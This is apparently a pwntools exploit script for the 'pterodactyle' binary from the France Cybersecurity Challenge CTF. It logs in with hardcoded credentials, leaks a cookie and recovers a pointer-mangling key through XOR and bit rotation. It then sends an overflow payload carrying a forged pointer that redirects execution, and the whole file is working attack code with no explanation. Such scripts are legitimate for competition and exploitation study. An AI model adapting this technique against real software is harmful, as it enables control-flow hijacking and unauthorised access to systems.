#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./pterodactyle")

context.binary = exe.path

if args.REMOTE:
    NL = b"\r\n"
else:
    NL = b"\n"


def conn():
    if args.REMOTE:
        r = remote("challenges.france-cybersecurity-challenge.fr", 2102)
    elif args.TRACE:
        r  = process(["strace", "-o","strace.out", exe.path])
    else:
        r = process([exe.path])
    return r

def attach_gdb():
    if args.GDB:
        gdb.attach(r, gdbscript="""
source ~/.gdbinit
""")

def leftRotate(n, d):
    return (n << d)|(n >> (64 - d))

def rightRotate(n, d):
    t = (n >> d)|(n << (64 - d))
    return t

def parse_cookie(b):
    return b.split(b':-)\n')[1].split(b'1: Log')[0]

def hex_cookie(lcookie):
    for cookie in lcookie:
        print(hex(u64(cookie)))


def list_cookie(cookie):
    l = [cookie[i*8:i*8+8] for i in range(8)]
    print(l)
    return l


def xor(ba1, ba2):
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])



def main():
    global r
    r = conn()
    attach_gdb()

    tip_1 = 0x55555555531f
    tip_2 = 0x555555555110
    tip_offset = tip_1 - tip_2

    offset_open = 0x555555555595-tip_1


    login = b'admin'
    pwd = b'MySeCr3TP4$$W0rd'

    r.recvuntil(b'>> ')
    r.send(b'1')
    r.recvuntil(b'>> ')
    r.send(login)
    r.recvuntil(b'>> ')
    r.send(pwd)
    r.recvuntil(b'>> ')
    r.send(b'2')

    sleep(0.5)
    cookie = parse_cookie(r.recv())
    lcookie = list_cookie(cookie)
    lucookie = [u64(c) for c in lcookie]

    xored_cookie = xor(cookie, b'\x77' * len(cookie))
    l_xored_cookie = list_cookie(xored_cookie)
    lu_xored_cookie = [u64(c) for c in l_xored_cookie]

    hex_cookie(lcookie)

    k = rightRotate(lucookie[7], 17)
    k = hex(k)[-16:]
    k = int(k,16)
    print(f"key : {hex(k)}")

    tip = lucookie[2]
    tip += tip_offset

    k = xor(p64(tip),p64(k))


    open = rightRotate(lucookie[7], 17)
    open = hex(open)[-16:]
    open = int(open,16)
    open = p64(open)
    open = xor(open,k)
    open = u64(open)
    print(hex(open))
    open = open + offset_open
    print(hex(open))
    open = p64(open)
    open = xor(open,k)
    open = u64(open)
    open = leftRotate(open,17)
    open = hex(open)[-16:]
    open = int(open,16)
    open = p64(open)
    open = xor(open,b'\x77'*8)
    print(hex(u64(open)))

    payload = login
    payload += b'A' * (32-len(login))
    payload += l_xored_cookie[0]
    payload += l_xored_cookie[1]
    payload += l_xored_cookie[2]
    payload += l_xored_cookie[3]
    payload += l_xored_cookie[4]
    payload += l_xored_cookie[5]
    payload += l_xored_cookie[6]
    payload += open


    r.send(b'1')
    r.recvuntil(b'>> ')

    r.send(payload)
    r.recvuntil(b'>> ')
    r.send(pwd)
    print(r.recv())


if __name__ == "__main__":
    main()
